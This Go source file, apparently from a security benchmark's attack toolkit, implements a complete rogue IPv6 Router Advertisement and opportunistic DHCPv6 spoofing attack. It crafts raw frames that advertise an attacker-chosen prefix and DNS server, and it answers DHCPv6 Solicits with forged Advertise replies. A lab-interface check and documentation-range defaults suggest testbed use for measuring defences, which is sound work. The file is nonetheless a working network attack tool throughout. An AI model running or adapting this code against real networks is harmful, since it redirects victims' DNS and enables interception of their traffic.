package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

const (
	etherTypeIPv6 = 0x86dd
	ipv6HeaderLen = 40
	udpHeaderLen  = 8
	icmpv6NextHdr = 58
	udpNextHdr    = 17
)

var (
	raEthernetDestination = net.HardwareAddr{0x33, 0x33, 0x00, 0x00, 0x00, 0x01}
	srcLLAddr             = net.HardwareAddr{0x02, 0x00, 0x00, 0xaa, 0xbb, 0xcc}
	serverDUID            = []byte{0x00, 0x03, 0x00, 0x01, 0x02, 0x00, 0x00, 0x00, 0xaa, 0xbb}
)

func internetChecksum(data []byte) uint16 {
	var sum uint32
	for len(data) >= 2 {
		sum += uint32(binary.BigEndian.Uint16(data[:2]))
		data = data[2:]
	}
	if len(data) == 1 {
		sum += uint32(data[0]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func ipv6Bytes(ip net.IP) ([16]byte, error) {
	var result [16]byte
	value := ip.To16()
	if value == nil {
		return result, fmt.Errorf("invalid IPv6 address %q", ip.String())
	}
	copy(result[:], value)
	return result, nil
}

// ipv6UpperLayerChecksum implements RFC 2460 section 8.1 for an ICMPv6
// upper-layer message. The caller supplies the message with checksum zeroed.
func ipv6UpperLayerChecksum(src, dst net.IP, nextHeader byte, message []byte) (uint16, error) {
	srcBytes, err := ipv6Bytes(src)
	if err != nil {
		return 0, err
	}
	dstBytes, err := ipv6Bytes(dst)
	if err != nil {
		return 0, err
	}

	pseudo := make([]byte, 40)
	copy(pseudo[0:16], srcBytes[:])
	copy(pseudo[16:32], dstBytes[:])
	binary.BigEndian.PutUint32(pseudo[32:36], uint32(len(message)))
	pseudo[39] = nextHeader
	return internetChecksum(append(pseudo, message...)), nil
}

func parsePrefix(prefixCIDR string) (net.IP, byte, error) {
	parts := strings.Split(prefixCIDR, "/")
	prefixText := parts[0]
	plenText := "64"
	if len(parts) > 1 {
		plenText = parts[1]
	}
	plen, err := strconv.Atoi(plenText)
	if err != nil || plen < 0 || plen > 128 {
		return nil, 0, fmt.Errorf("invalid IPv6 prefix length %q", plenText)
	}
	prefix := net.ParseIP(prefixText).To16()
	if prefix == nil || prefix.To4() != nil {
		return nil, 0, fmt.Errorf("invalid IPv6 prefix %q", prefixText)
	}
	return prefix, byte(plen), nil
}

func buildRA(prefixCIDR string, dnsServer net.IP, srcMAC net.HardwareAddr, srcIP net.IP) ([]byte, error) {
	if len(srcMAC) != 6 {
		return nil, fmt.Errorf("source MAC must contain six octets")
	}
	prefix, prefixLen, err := parsePrefix(prefixCIDR)
	if err != nil {
		return nil, err
	}
	dns, err := ipv6Bytes(dnsServer)
	if err != nil {
		return nil, err
	}
	source, err := ipv6Bytes(srcIP)
	if err != nil {
		return nil, err
	}
	destination := net.ParseIP("ff02::1")
	destinationBytes, err := ipv6Bytes(destination)
	if err != nil {
		return nil, err
	}

	icmp := make([]byte, 16, 16+32+8+24)
	icmp[0] = 134 // Router Advertisement
	// icmp[1] is the ICMPv6 code, which is zero.
	icmp[4] = 64 // chlim
	// M=0, O=0, H=0, prf=1, P=0, res=0. Scapy's default prf is non-zero.
	icmp[5] = 0x08
	binary.BigEndian.PutUint16(icmp[6:8], 1800)
	// reachabletime and retranstimer remain Scapy's zero defaults.

	prefixOption := make([]byte, 32)
	prefixOption[0] = 3
	prefixOption[1] = 4
	prefixOption[2] = prefixLen
	prefixOption[3] = 0xc0 // L=1, A=1, R=0, res1=0
	binary.BigEndian.PutUint32(prefixOption[4:8], 86400)
	binary.BigEndian.PutUint32(prefixOption[8:12], 14400)
	copy(prefixOption[16:32], prefix)
	icmp = append(icmp, prefixOption...)

	sourceLLAddrOption := []byte{1, 1, srcLLAddr[0], srcLLAddr[1], srcLLAddr[2], srcLLAddr[3], srcLLAddr[4], srcLLAddr[5]}
	icmp = append(icmp, sourceLLAddrOption...)

	// One DNS address gives RDNSS len=(2*count)+1=3 in units of 8 bytes.
	rdnssOption := make([]byte, 24)
	rdnssOption[0] = 25
	rdnssOption[1] = 3
	binary.BigEndian.PutUint32(rdnssOption[4:8], 1800)
	copy(rdnssOption[8:24], dns[:])
	icmp = append(icmp, rdnssOption...)

	checksum, err := ipv6UpperLayerChecksum(srcIP, destination, icmpv6NextHdr, icmp)
	if err != nil {
		return nil, err
	}
	binary.BigEndian.PutUint16(icmp[2:4], checksum)

	ipv6 := make([]byte, ipv6HeaderLen)
	binary.BigEndian.PutUint32(ipv6[0:4], 0x60000000)
	binary.BigEndian.PutUint16(ipv6[4:6], uint16(len(icmp)))
	ipv6[6] = icmpv6NextHdr
	ipv6[7] = 255
	copy(ipv6[8:24], source[:])
	copy(ipv6[24:40], destinationBytes[:])

	frame := make([]byte, 14, 14+len(ipv6)+len(icmp))
	copy(frame[0:6], raEthernetDestination)
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], etherTypeIPv6)
	frame = append(frame, ipv6...)
	frame = append(frame, icmp...)
	return frame, nil
}

func interfaceLinkLocal(ifaceName string) net.IP {
	device, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return net.IPv6zero
	}
	addresses, err := device.Addrs()
	if err != nil {
		return net.IPv6zero
	}
	for _, address := range addresses {
		var ip net.IP
		switch value := address.(type) {
		case *net.IPNet:
			ip = value.IP
		case *net.IPAddr:
			ip = value.IP
		default:
			ip, _, _ = net.ParseCIDR(address.String())
		}
		value := ip.To16()
		if value != nil && value.To4() == nil && value[0] == 0xfe && value[1]&0xc0 == 0x80 {
			return append(net.IP(nil), value...)
		}
	}
	return net.IPv6zero
}

func buildIPv6UDPFrame(dstMAC, srcMAC net.HardwareAddr, srcIP, dstIP net.IP, sport, dport uint16, payload []byte, hopLimit byte) ([]byte, error) {
	if len(dstMAC) != 6 || len(srcMAC) != 6 {
		return nil, fmt.Errorf("Ethernet MAC addresses must contain six octets")
	}
	source, err := ipv6Bytes(srcIP)
	if err != nil {
		return nil, err
	}
	destination, err := ipv6Bytes(dstIP)
	if err != nil {
		return nil, err
	}
	udp := attackcommon.BuildUDP(srcIP, dstIP, sport, dport, payload, true)
	ipv6 := make([]byte, ipv6HeaderLen)
	binary.BigEndian.PutUint32(ipv6[0:4], 0x60000000)
	binary.BigEndian.PutUint16(ipv6[4:6], uint16(len(udp)))
	ipv6[6] = udpNextHdr
	ipv6[7] = hopLimit
	copy(ipv6[8:24], source[:])
	copy(ipv6[24:40], destination[:])

	frame := make([]byte, 14, 14+len(ipv6)+len(udp))
	copy(frame[0:6], dstMAC)
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], etherTypeIPv6)
	frame = append(frame, ipv6...)
	frame = append(frame, udp...)
	return frame, nil
}

func appendDHCP6Option(message []byte, code uint16, value []byte) []byte {
	header := make([]byte, 4)
	binary.BigEndian.PutUint16(header[0:2], code)
	binary.BigEndian.PutUint16(header[2:4], uint16(len(value)))
	message = append(message, header...)
	return append(message, value...)
}

func buildDHCP6Advertise(dstMAC, srcMAC net.HardwareAddr, srcIP, dstIP net.IP, trid [3]byte, clientIDOpt []byte, dnsServer net.IP) ([]byte, error) {
	message := []byte{2, trid[0], trid[1], trid[2]}
	if len(clientIDOpt) != 0 {
		message = append(message, clientIDOpt...)
	}
	message = appendDHCP6Option(message, 2, serverDUID)
	dns, err := ipv6Bytes(dnsServer)
	if err != nil {
		return nil, err
	}
	message = appendDHCP6Option(message, 23, dns[:])
	return buildIPv6UDPFrame(dstMAC, srcMAC, srcIP, dstIP, 547, 546, message, 64)
}

func parseIPv6UDP(frame []byte) (srcMAC net.HardwareAddr, srcIP net.IP, sport, dport uint16, udpPayload []byte, ok bool) {
	_, srcMAC, ethertype, _, payload := attackcommon.ParseEthernet(frame)
	if ethertype != etherTypeIPv6 || len(payload) < ipv6HeaderLen {
		return nil, nil, 0, 0, nil, false
	}
	if payload[0]>>4 != 6 || payload[6] != udpNextHdr {
		return nil, nil, 0, 0, nil, false
	}
	payloadLen := int(binary.BigEndian.Uint16(payload[4:6]))
	if payloadLen < udpHeaderLen || ipv6HeaderLen+payloadLen > len(payload) {
		return nil, nil, 0, 0, nil, false
	}
	udp := payload[ipv6HeaderLen : ipv6HeaderLen+payloadLen]
	udpLen := int(binary.BigEndian.Uint16(udp[4:6]))
	if udpLen < udpHeaderLen || udpLen > len(udp) {
		return nil, nil, 0, 0, nil, false
	}
	srcIP = append(net.IP(nil), payload[8:24]...)
	sport = binary.BigEndian.Uint16(udp[0:2])
	dport = binary.BigEndian.Uint16(udp[2:4])
	udpPayload = udp[udpHeaderLen:udpLen]
	return srcMAC, srcIP, sport, dport, udpPayload, true
}

func isReceiveTimeout(err error) bool {
	return errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) || errors.Is(err, os.ErrDeadlineExceeded)
}

func opportunisticDHCP6(receiverIface string, sender *attackcommon.RawSender, srcMAC net.HardwareAddr, srcIP, dnsServer net.IP, interval float64) error {
	listenFor := 2.0
	if interval < listenFor {
		listenFor = interval
	}
	if listenFor < 0.1 {
		listenFor = 0.1
	}
	deadline := time.Now().Add(time.Duration(listenFor * float64(time.Second)))
	receiver, err := attackcommon.OpenRawReceiver(receiverIface)
	if err != nil {
		return err
	}
	defer receiver.Close()

	for time.Now().Before(deadline) {
		if err := receiver.SetReadDeadline(deadline); err != nil {
			return err
		}
		frame, err := receiver.ReadFrame()
		if err != nil {
			if isReceiveTimeout(err) {
				return nil
			}
			return err
		}
		clientMAC, solicitSrc, sport, dport, udpPayload, ok := parseIPv6UDP(frame)
		if !ok || sport != 546 || dport != 547 {
			continue
		}
		msgType, trid, clientIDOpt, ok := attackcommon.ParseDHCP6(udpPayload)
		if !ok || msgType != 1 {
			continue
		}
		reply, err := buildDHCP6Advertise(clientMAC, srcMAC, srcIP, solicitSrc, trid, clientIDOpt, dnsServer)
		if err != nil {
			return err
		}
		if err := sender.Send(reply); err != nil {
			return fmt.Errorf("send DHCPv6 Advertise: %w", err)
		}
		attackcommon.Status("SENT", fmt.Sprintf("DHCPv6 Advertise -> %s (dns=%s)", solicitSrc, dnsServer))
	}
	return nil
}

func run() int {
	fs, common := attackcommon.BaseParser("Rogue IPv6 RA + opportunistic DHCPv6 spoof")
	prefix := fs.String("prefix", "2001:db8:dead::/64", "advertised on-link prefix")
	dnsServerText := fs.String("dns_server", "2001:db8:dead::1", "DNS (RDNSS) to advertise / hand out via DHCPv6")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	dnsServer := net.ParseIP(*dnsServerText)
	if dnsServer == nil || dnsServer.To4() != nil {
		attackcommon.Status("FATAL", fmt.Sprintf("invalid IPv6 address %q", *dnsServerText))
		return 1
	}
	srcMAC := attackcommon.InterfaceMAC(common.Iface)
	srcIP := interfaceLinkLocal(common.Iface)
	pkt, err := buildRA(*prefix, dnsServer, srcMAC, srcIP)
	if err != nil {
		attackcommon.Status("FATAL", fmt.Sprintf("RA packet build failed: %v", err))
		return 1
	}
	if common.Selftest {
		attackcommon.SelftestOK("ra_spoof", fmt.Sprintf("RA len=%d prefix=%s", len(pkt), *prefix))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		frame, err := buildRA(*prefix, dnsServer, srcMAC, srcIP)
		if err != nil {
			return err
		}
		if err := sender.Send(frame); err != nil {
			return fmt.Errorf("send RA: %w", err)
		}
		attackcommon.Status("SENT", fmt.Sprintf("RA #%d prefix=%s dns=%s", n+1, *prefix, *dnsServerText))

		if err := opportunisticDHCP6(common.Iface, sender, srcMAC, srcIP, dnsServer, common.Interval); err != nil {
			attackcommon.Status("WARN", fmt.Sprintf("dhcpv6 opportunistic reply skipped: %v", err))
		}
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
